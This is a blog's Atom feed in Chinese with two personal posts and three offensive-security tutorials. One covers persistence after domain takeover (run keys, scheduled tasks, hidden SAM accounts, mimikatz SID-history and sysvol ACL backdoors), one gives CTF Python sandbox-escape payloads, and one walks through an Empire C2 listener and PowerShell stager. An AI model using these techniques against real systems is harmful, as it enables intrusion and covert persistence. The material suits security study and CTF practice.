<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-09-15T14:50:12.098Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>北京的最后一晚</title>
    <link href="http://yoursite.com/2018/09/15/%E5%8C%97%E4%BA%AC%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E6%99%9A/"/>
    <id>http://yoursite.com/2018/09/15/北京的最后一晚/</id>
    <published>2018-09-15T14:33:59.000Z</published>
    <updated>2018-09-15T14:50:12.098Z</updated>
    
    <content type="html"><![CDATA[<p>7月中旬,带着梦想与诗来到了北京,来到了之前憧憬已久的公司;9月中旬,我还是选择回到了重庆.</p>
<p>并不是说北京有多不好,而是当我离开家乡的时候我才真正意识到:重庆才是我真正魂牵梦绕的地方.在入职的两个多月里,跟着这支团队一起学习一起成长,虽然自己可能并没有取得多大成就或者说是干了多少事情,但是我至少可以很自豪的说:这两个月里我的的确确是过得十分的充实.</p>
<p>北京的空气中都弥漫着焦躁与不安,这的确与我过去三年的安逸生活截然相反;我并不是反感这种情绪,而是当这种情绪成为一种日常的时候,我便觉得生活已经索然无味,失去了其本来应存在的价值.虽然年轻的时候就应该多折腾折腾,但是这可能对于懒惰的我来说,太过于苛刻了吧.</p>
<p>虽然对于北京的印象不是特别的好,但是对于我来说,能够融入团队,确实是非常值得骄傲的一件事情,特别是大家都把你当作自己人看待的那一种感觉是特别自豪的,就像自己的努力得到了证明一样的感觉.</p>
<p>很感谢能够介绍我来北京的学长,如果没有学长的内推我恐怕是来不了北京,也很感谢学长这两个月来的照顾;也很感谢我的老大城哥,跟着城哥学到了很多新东西,开阔了新视野,也很感谢城哥能让我在公司自己做自己喜爱的领域,学习自己喜爱的东西,实践自己的想法,十分感谢.</p>
<p>晚安,北京.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;7月中旬,带着梦想与诗来到了北京,来到了之前憧憬已久的公司;9月中旬,我还是选择回到了重庆.&lt;/p&gt;
&lt;p&gt;并不是说北京有多不好,而是当我离开家乡的时候我才真正意识到:重庆才是我真正魂牵梦绕的地方.在入职的两个多月里,跟着这支团队一起学习一起成长,虽然自己可能并没有取得多大
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>后渗透维持权限的一些手段</title>
    <link href="http://yoursite.com/2018/08/26/%E5%90%8E%E6%B8%97%E9%80%8F%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%89%8B%E6%AE%B5/"/>
    <id>http://yoursite.com/2018/08/26/后渗透维持权限的一些手段/</id>
    <published>2018-08-26T07:38:06.000Z</published>
    <updated>2018-08-26T07:38:20.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-写在最前面"><a href="#0x00-写在最前面" class="headerlink" title="0x00 写在最前面"></a>0x00 写在最前面</h1><p>在拿到域控之后我们有许多手段来维持自己的权限,今天在这里就当作是一个自己的记录,还有作为抛砖引玉,欢迎大家多多交流.</p>
<h1 id="0x01-自启的一些手段"><a href="#0x01-自启的一些手段" class="headerlink" title="0x01 自启的一些手段"></a>0x01 自启的一些手段</h1><p>在拿到权限之后,通过对目标机器种植自启的远控不失为一种维持权限的手法,在这里提几种自启的手段.</p>
<ol>
<li><p>首先是注册表自启,直接把运行的程序/脚本加入<code>HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run</code>即可;或者是通过logon scripts脚本也可达到自启的目的,所需要做的就是在<code>HKEY_CURRENT_USER/Environment</code>这个注册表创建一个键名为<code>UserInitMprLogonScript</code>的字符串键,键值为需要自启的脚本或者程序.</p>
<pre><code>这两种方法几乎都要做到文件落地,而且查杀比较容易,但是添加手段比较容易.
</code></pre></li>
<li><p>攻击者可以通过Schtasks的方式每天在特定时间段或者开机的时候运行攻击者所指定的命令.例如<code>schtasks.exe /Create /TN update /TR xx(your command)  /SC ONLOGON /F /RL HIGHEST</code>就是在每天开机的时候运行攻击者自定义的command.</p>
</li>
<li><p>wmi后门的兴起主要是在defcon23之后的演讲,wmi后门触发的方式就不像前两种那么单一,他的触发点可以是开机或者是某个特定开关被触发(比如每周五早上九点)之类,wmi也可以结合powershell做到无文件后门,有兴趣的朋友可以自己去了解一下,这里附上<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1" target="_blank" rel="external">PowerSploit的一段后门</a>.</p>
</li>
</ol>
<h1 id="0x02-Windows隐藏用户的建立"><a href="#0x02-Windows隐藏用户的建立" class="headerlink" title="0x02 Windows隐藏用户的建立"></a>0x02 Windows隐藏用户的建立</h1><p>Windows隐藏用户的建立主要参考<a href="https://3gstudent.github.io/" target="_blank" rel="external">3gstudent前辈</a>的<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/" target="_blank" rel="external">这篇博文</a>.其主要步骤如下:</p>
<p>首先即赋予当前用户对<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>该键值的完全访问权限(可读可写),然后通过<code>net user</code>命令添加一个不可见特殊账户,再从注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>导出创建特殊用户的注册表然后删除它,并从注册表<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</code>找到特殊用户对应类型的注册表项并在导出后删除掉它,修改后者键F的值为管理员账户对应注册表键值(默认为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code>)键F的值,再导入这两个注册表即可完成隐藏用户的建立.</p>
<h1 id="0x03-Sid-history构建DA后门"><a href="#0x03-Sid-history构建DA后门" class="headerlink" title="0x03 Sid history构建DA后门"></a>0x03 Sid history构建DA后门</h1><p>我们可以利用Sid History的特性为一个普通用户赋予域控权限,在mimikatz上面命令如下</p>
<pre><code>mimikatz.exe
privilege::debug
sid::patch
sid::add /sam:test_account /new:dcfortest\administrator
</code></pre><p>在完成上述命令之后即可为test_account赋予了domain admins权限并且通过<code>net user test_account /domain</code>并不能看到test_account属于<code>domain admins</code>用户组.该后门的查杀需要管理员去域控翻看sid history的日志(id为4765和4766).</p>
<h1 id="0x04-ACL后门"><a href="#0x04-ACL后门" class="headerlink" title="0x04 ACL后门"></a>0x04 ACL后门</h1><p>众所周知,普通用户对于sysvol目录只拥有可读不可写的权限,我们可以通过该方式来构建一个域的后门.在域控执行如下的powershell命令</p>
<pre><code>icals c:\windows\sysvol\sysvol\dcfortest.com\policies\ /grant server1:F /inheritance:e
</code></pre><p>执行完成之后server1账户即拥有了对sysvol目录可读可写的权限,之后要做的事情不再赘述.</p>
<h1 id="0x05-后话"><a href="#0x05-后话" class="headerlink" title="0x05 后话"></a>0x05 后话</h1><p>只是介绍了一些比较基础的维持权限的手法,还有一些手法并没有写上,在这里只是起一个抛砖引玉的作用,欢迎大家多多指教.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-写在最前面&quot;&gt;&lt;a href=&quot;#0x00-写在最前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在最前面&quot;&gt;&lt;/a&gt;0x00 写在最前面&lt;/h1&gt;&lt;p&gt;在拿到域控之后我们有许多手段来维持自己的权限,今天在这里就当作是一个自己的记
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>胡思乱想</title>
    <link href="http://yoursite.com/2018/07/10/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/"/>
    <id>http://yoursite.com/2018/07/10/胡思乱想/</id>
    <published>2018-07-10T14:45:31.000Z</published>
    <updated>2018-07-10T14:46:50.729Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-没有什么了"><a href="#0x00-没有什么了" class="headerlink" title="0x00 没有什么了"></a>0x00 没有什么了</h4><p>我可真是个废物啊</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-没有什么了&quot;&gt;&lt;a href=&quot;#0x00-没有什么了&quot; class=&quot;headerlink&quot; title=&quot;0x00 没有什么了&quot;&gt;&lt;/a&gt;0x00 没有什么了&lt;/h4&gt;&lt;p&gt;我可真是个废物啊&lt;/p&gt;

    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python SandBox Bypass</title>
    <link href="http://yoursite.com/2017/10/22/Python-SandBox-Bypass/"/>
    <id>http://yoursite.com/2017/10/22/Python-SandBox-Bypass/</id>
    <published>2017-10-22T13:11:15.000Z</published>
    <updated>2017-11-05T16:58:02.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-shell执行函数"><a href="#0x00-shell执行函数" class="headerlink" title="0x00 shell执行函数"></a>0x00 shell执行函数</h4><pre><code>os.system(&apos;whoami&apos;)
os.popen(&apos;whoami&apos;).read()
commands.getoutput(&apos;whoami&apos;)
commands.getstatusoutput(&apos;whoami&apos;)
subprocess.call([&apos;whoami&apos;],shell=True)
</code></pre><h4 id="0x01-Bypass敏感包过滤"><a href="#0x01-Bypass敏感包过滤" class="headerlink" title="0x01 Bypass敏感包过滤"></a>0x01 Bypass敏感包过滤</h4><p>过滤函数:</p>
<pre><code>banned = [
&quot;os&quot;,
&quot;subprocess&quot;,
&quot;sys&quot;,
&quot;commands&quot;
]
while 1:
    x=raw_input(&apos;&gt;&gt;&gt;&apos;)
    if len([i for i in banned if i not in x])==4:
        try:
            exec(x)
        except:
            print(&apos;exec error&apos;)
    else:
        print(&apos;error&apos;)
</code></pre><p>bypass:</p>
<pre><code>__import__(&quot;o&quot;+&quot;s&quot;).system(&apos;whoami&apos;)
__import__(&quot;bf&quot;.decode(&apos;rot_13&apos;)).system(&quot;whoami&quot;)
</code></pre><p>如果知道目录的话还可以直接使用execfile直接导入包,例如:</p>
<pre><code>execfile(&apos;/usr/lib/python2.7/o&apos;+&apos;s.py&apos;);system(&apos;whoami&apos;)
</code></pre><h4 id="0x02-内置类型对象"><a href="#0x02-内置类型对象" class="headerlink" title="0x02 内置类型对象"></a>0x02 内置类型对象</h4><p>过滤函数:</p>
<pre><code>from __future__ import print_function

print(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)

banned = [  
    &quot;import&quot;,
    &quot;exec&quot;,
    &quot;eval&quot;,
    &quot;pickle&quot;,
    &quot;os&quot;,
    &quot;subprocess&quot;,
    &quot;kevin sucks&quot;,
    &quot;input&quot;,
    &quot;banned&quot;,
    &quot;cry sum more&quot;,
    &quot;sys&quot;
]

targets = list(__builtins__.__dict__.keys())  
targets.remove(&apos;input&apos;)  
targets.remove(&apos;print&apos;)  
exec_ = exec
for x in targets:  
    del __builtins__.__dict__[x]

while 1:
    try:  
        print(&quot;&gt;&gt;&gt;&quot;, end=&apos; &apos;)
        data = input()

        for no in banned:
            if no.lower() in data.lower():
                print(&quot;[-] &quot; + no)
                break
        else: # this means nobreak
            exec_(data)
    except:
        print(&apos;[+]error!!!!&apos;)
</code></pre><p>查找对应module:</p>
<pre><code>[m for m in [i for i in [].__class__.__base__.__subclasses__() if &apos;&lt;class&apos; in str(i) and &apos;__globals__&apos; in dir(i.__init__)] if &apos;system&apos; in [n for n in m.__init__.__globals__.keys()]]
</code></pre><p>python3.5.2返回:</p>
<pre><code>[&lt;class &apos;os._wrap_close&apos;&gt;, &lt;class &apos;os._DummyDirEntry&apos;&gt;]
</code></pre><p>shell:</p>
<pre><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == &apos;_DummyDirEntry&apos;][0].__init__.__globals__[&apos;sy&apos;+&apos;stem&apos;](&apos;whoami&apos;)
</code></pre><p>合成一句就是:</p>
<pre><code>[c for c in [].__class__.__base__.__subclasses__() if c.__name__ == [m.__name__ for m in [i for i in [].__class__.__base__.__subclasses__() if &apos;&lt;class&apos; in str(i) and &apos;__globals__&apos; in dir(i.__init__)] if &apos;system&apos; in [n for n in m.__init__.__globals__.keys()]][0]][0].__init__.__globals__[&apos;sy&apos;+&apos;stem&apos;](&apos;whoami&apos;)
</code></pre><p>可读性比较差了…</p>
<p>这里这个这道题我是用sys先读出了他的python版本号(因为也删除了<code>str()</code>),再用对应的内置对象getshell.</p>
<h4 id="0x03-Another-Way"><a href="#0x03-Another-Way" class="headerlink" title="0x03 Another Way"></a>0x03 Another Way</h4><p>use the timeit<br>swpu2017年的ctf比赛,直接上poc:</p>
<pre><code>import timeit
z=&quot;&quot;&quot;
import time
def fuck_length(len):
    try:
        z=open(&apos;flag&apos;,&apos;r&apos;).read()
        for i in z[len]:
            time.sleep(ord(i)*0.001)
    except:
        pass
&quot;&quot;&quot;
for i in range(0,29):
    print chr(int(timeit.timeit(&apos;fuck_length({0})&apos;.format(i),number=1,setup=z)*1000)),
</code></pre><p>因为他这里似乎禁掉了回显的原因,所以就这样dirty hack了(:逃</p>
<h4 id="0x04-links"><a href="#0x04-links" class="headerlink" title="0x04 links"></a>0x04 links</h4><pre><code>http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
http://www.cnblogs.com/iamstudy/articles/python_eval_and_bypass_sandbox_study.html
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-shell执行函数&quot;&gt;&lt;a href=&quot;#0x00-shell执行函数&quot; class=&quot;headerlink&quot; title=&quot;0x00 shell执行函数&quot;&gt;&lt;/a&gt;0x00 shell执行函数&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;os.system(&amp;apo
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Empire 速食指南</title>
    <link href="http://yoursite.com/2017/08/17/test/"/>
    <id>http://yoursite.com/2017/08/17/test/</id>
    <published>2017-08-17T14:51:01.000Z</published>
    <updated>2017-08-17T15:47:17.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-install"><a href="#0x00-install" class="headerlink" title="0x00 install"></a>0x00 install</h4><pre><code>git clone https://github.com/EmpireProject/Empire.git
./setup/install.sh
</code></pre><h4 id="0x01-quick-start"><a href="#0x01-quick-start" class="headerlink" title="0x01 quick start"></a>0x01 quick start</h4><p>安装完成之后<code>./empire</code>即可运行Empire<br>建立一个监听:</p>
<pre><code>listeners
uselistener http
set Name Empire
set Host http://192.168.2.131:1080
execute
</code></pre><p>再返回主菜单(main)生成stager:</p>
<pre><code>usestager windows/dll
set Listener Empire
execute
launcher powershell Empire
</code></pre><p>将生成的powershell命令在目标机器上执行即可拿到一个shell,<code>agents</code>命令可查看上线主机,<code>interact NAME</code>可以获得一个交互的shell</p>
<h4 id="0x02-something-others"><a href="#0x02-something-others" class="headerlink" title="0x02 something others"></a>0x02 something others</h4><p>你懂的</p>
<pre><code>mimikatz
bypassuac
</code></pre><p>上传下载</p>
<pre><code>download
upload
</code></pre><p>导入执行powershell:</p>
<pre><code>scriptimport
scriptcmd
</code></pre><p>some module</p>
<pre><code>situational_awareness/network/powerview/get_user (获取用户信息)
powershell/situational_awareness/network/powerview/user_hunter(查看有记录的当前域的所有与管理员的机器)
powershell/situational_awareness/network/powerview/get_localgroup(检测administrator群组用户）
</code></pre><p>使用<code>searchmodule</code>可以查看模块的说明,模块比较多,就不一一说明了</p>
<h3 id="0x03-the-end"><a href="#0x03-the-end" class="headerlink" title="0x03 the end"></a>0x03 the end</h3><p>我觉得我还是喜欢msf多一些</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-install&quot;&gt;&lt;a href=&quot;#0x00-install&quot; class=&quot;headerlink&quot; title=&quot;0x00 install&quot;&gt;&lt;/a&gt;0x00 install&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;git clone https://gith
    
    </summary>
    
    
  </entry>
  
</feed>
